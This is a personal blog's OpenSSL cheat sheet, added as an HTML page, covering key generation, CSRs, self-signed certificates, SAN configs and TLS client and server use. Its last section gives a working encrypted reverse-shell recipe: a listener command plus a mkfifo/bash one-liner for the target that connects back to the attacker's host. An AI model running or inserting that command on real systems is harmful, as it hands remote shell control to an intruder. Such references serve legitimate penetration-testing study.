@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Openssl &middot; Agr0 Hacks Stuff </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.80.0" />
+
+
+
+
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://agrohacksstuff.io/css/nix.css">
+
+
+
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata%7COpen+Sans%7CConcert+One" rel="stylesheet">
+
+
+
+
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+      <a class="navbar-brand" id="green-terminal" href='https://agrohacksstuff.io/'>
+        agr0@agrohacksstuff.io ~ $
+      </a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href='https://agrohacksstuff.io/'>/home/agr0</a>
+        </li>
+        
+				
+				
+				<li class="dropdown">
+                    
+            		<a href="https://agrohacksstuff.io/crypto">~/crypto</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a href="https://agrohacksstuff.io/cheatsheets">~/cheat sheets</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a href="https://agrohacksstuff.io/about">~/about</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a href="https://agrohacksstuff.io/python">~/python</a>
+            		
+        		</li>
+        		
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="flex-wrapper">
+            <div class="container wrapper">
+                <h1><a href="https://agrohacksstuff.io/cheatsheets/openssl/">Openssl</a></h1>
+                <span class="post-date">2021-01-27 </span>
+                <div class="post-content">
+                    <p>OpenSSL is one of those applications that I use so often, but <em>rarely</em> do I ever recall what I&rsquo;m supposed to do from memory. I&rsquo;m always looking it up or eventually copying down some of the more frequent uses I have with it in my OneNote document. So here it is on my site, some quick one-off commands with OpenSSL.</p>
+<h1 id="generate-a-server-key">Generate a Server Key</h1>
+<p>To generate a server key (used in AES/RSA), use the following commands, and keep this key secure!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl genrsa -out mykey.key <span style="color:#ae81ff">2048</span>
+</code></pre></div><p>I&rsquo;ve heard that while a 4096-bit key is significantly more secure, it is also more CPU intensive to decrypt, so while dealing with TLS certificates the general consensus is to use 2048 since it is &ldquo;good enough&rdquo; to the point where computational power these days can&rsquo;t feasibly brute force the key in a reasonable amount of time, and it doesn&rsquo;t slow down the connection time for the client like 4096-bits would. But still, YMMV.</p>
+<p>Now keep it secure:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod <span style="color:#ae81ff">600</span> mykey.key
+</code></pre></div><h1 id="generate-a-certificate-sign-request">Generate a Certificate Sign Request</h1>
+<p>To get an official certificate, you need to generate a CSR which is to be signed by the trusted third party. Usually you pay a company to do this. You can do it yourself, but you&rsquo;re basically telling everyone that you&rsquo;re super trustworthy and no one should ever doubt you. And come on, you remember that time in Tijuana, don&rsquo;t you? We do.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl req -new -key mykey.key -out mycert.csr
+</code></pre></div><p>You&rsquo;ll then be prompted for a bunch of metadata about the certificate. Make sure you don&rsquo;t put anything too damning in the file and you&rsquo;ll be alright. You should also use a challenge password as well I guess, but that&rsquo;s up to you.</p>
+<h1 id="self-signing-a-csr-without-a-pre-existing-key">Self-signing a CSR without a pre-existing key</h1>
+<p>You should never do this in any sort of production environment. It trains users to accept fraudulent certificates generated by just about anybody, but sometimes you need to have some sort of cert there so <em>at least data isn&rsquo;t transmitted in the clear</em>, so here&rsquo;s how to sign a CSR. <strong>NOTE</strong>: This creates the key AND the signed certificate.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl req -newkey rsa:2048 -nodes -keyout mydomain.key -x509 -days <span style="color:#ae81ff">365</span> -out mydomain.crt
+</code></pre></div><p>This will prompt you for all the metadata about the certificate as mentioned in generating a CSR.</p>
+<h1 id="self-signing-a-csr-with-a-pre-existing-key">Self-signing a CSR WITH a pre-existing key</h1>
+<p>To do the above with a key that you&rsquo;ve already generated, use the following command:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl req -key mykey.key -new -x509 -days <span style="color:#ae81ff">365</span> -out mycert.crt
+</code></pre></div><h1 id="sign-a-certificate-sign-request-with-a-global-ca-key">Sign a Certificate Sign Request with a global CA key</h1>
+<p>If you have the global CA key and want to legitimately sign a CSR, you can use this command:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl x509 -req -in mycert.csr -CA ca.cert.pem -CAkey ca.key.pem -CAcreateserial -out mycert.crt -days <span style="color:#ae81ff">365</span> -sha512
+</code></pre></div><h1 id="view-the-metadata-of-a-certificate-or-csr">View the metadata of a Certificate or CSR</h1>
+<p>You can view the metadata of a certificate or CSR (such as the expiration date of the certificate or anything else about it) with the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl x509 -in mycert.crt -noout -text
+</code></pre></div><h1 id="create-a-csr-with-subject-altnernate-names">Create a CSR with Subject Altnernate Names</h1>
+<p>This requires a little more work, and hopefully there&rsquo;s a better one-liner way to do it, but until I found that out, the first thing you should do is create a file called <code>san.cnf</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ini" data-lang="ini"><span style="color:#66d9ef">[req]</span>
+<span style="color:#a6e22e">distinguished_name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">req_distinguished_name</span>
+<span style="color:#a6e22e">req_extensions</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">v3_req</span>
+<span style="color:#a6e22e">prompt</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">no</span>
+<span style="color:#66d9ef">[req_distinguished_name]</span>
+<span style="color:#a6e22e">C</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">US</span>
+<span style="color:#a6e22e">ST</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">California</span>
+<span style="color:#a6e22e">L</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">Sacremento</span>
+<span style="color:#a6e22e">O</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">Widgets, Inc</span>
+<span style="color:#a6e22e">OU</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">Accounting</span>
+<span style="color:#a6e22e">CN</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">widgets.example.com</span>
+<span style="color:#66d9ef">[v3_req]</span>
+<span style="color:#a6e22e">keyUsage</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">keyEncipherment, dataEncipherment</span>
+<span style="color:#a6e22e">extendedKeyUsage</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">serverAuth</span>
+<span style="color:#a6e22e">subjectAltName</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">@alt_names</span>
+<span style="color:#66d9ef">[alt_names]</span>
+<span style="color:#a6e22e">DNS.1</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">morewidgets.example.com</span>
+<span style="color:#a6e22e">DNS.2</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">evenmorewidgets.example.com</span>
+<span style="color:#a6e22e">DNS.3</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">toomanywidgets.example.com</span>
+</code></pre></div><p>Obviously fill out the above with more appropriate data to your needs, then run the following to generate both the private key and the CSR file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl req -out widgets.csr -newkey rsa:2048 -nodes -keyout private.key -config san.cnf
+</code></pre></div><p>Don&rsquo;t forget to <code>chmod 600 private.key</code> afterwards!</p>
+<hr>
+<h1 id="connect-to-tls-encrypted-service">Connect to TLS-encrypted Service</h1>
+<p>Is a service listening on some port that&rsquo;s encrypted but you want to send raw data to it? You can use OpenSSL&rsquo;s client application to connect to it as you would using netcat or telnet, only it handles the encryption overhead so you can communicate with the server on a raw level!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl s_client -connect &lt;RHOST&gt;:&lt;RPORT&gt;
+</code></pre></div><p>Upon connecting, you should see the TLS overhead of the handshake stuff until ultimately the connection is finally made. You can suppress that with the <code>-quiet</code> flag.</p>
+<h1 id="create-tls-encrypted-listener">Create TLS-encrypted listener</h1>
+<p>Similarly, you can start a listener that is encrypted using openssl as well:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl s_server -key mykey.key -cert mycert.crt -port <span style="color:#ae81ff">9090</span>
+</code></pre></div><p>You can add the <code>-quiet</code> flag here as well.</p>
+<h1 id="openssl-based-reverse-shell">OpenSSL-based reverse shell</h1>
+<p>For the crafty hacker, you can encrypt the shell across the wire using openssl as well.</p>
+<ol>
+<li>First, generate the key on your local box:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days <span style="color:#ae81ff">365</span> -nodes
+<span style="color:#75715e"># hit enter for default until key is generated</span>
+</code></pre></div><ol start="2">
+<li>Then, start the listener:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl s_server -quiet -key key.pem -cert cert.pem -port <span style="color:#ae81ff">9090</span>
+</code></pre></div><ol start="3">
+<li>Now on the remote server, execute the following:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkfifo /tmp/a; /bin/bash -I 2&gt;&amp;<span style="color:#ae81ff">1</span> &lt;/tmp/a | openssl s_client -quiet -connect &lt;LHOST&gt;:9090 &gt;/tmp/a;rm /tmp/a
+</code></pre></div><p>OpenSSL is really handy to know!</p>
+
+                </div>
+                
+                <div class="post-comments">
+                    
+                </div>
+                
+            </div>
+            <footer class="footer text-center">
+<p>Copyright &copy; 2021 Agr0 -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+</footer>
+
+        </div>
+    </body>
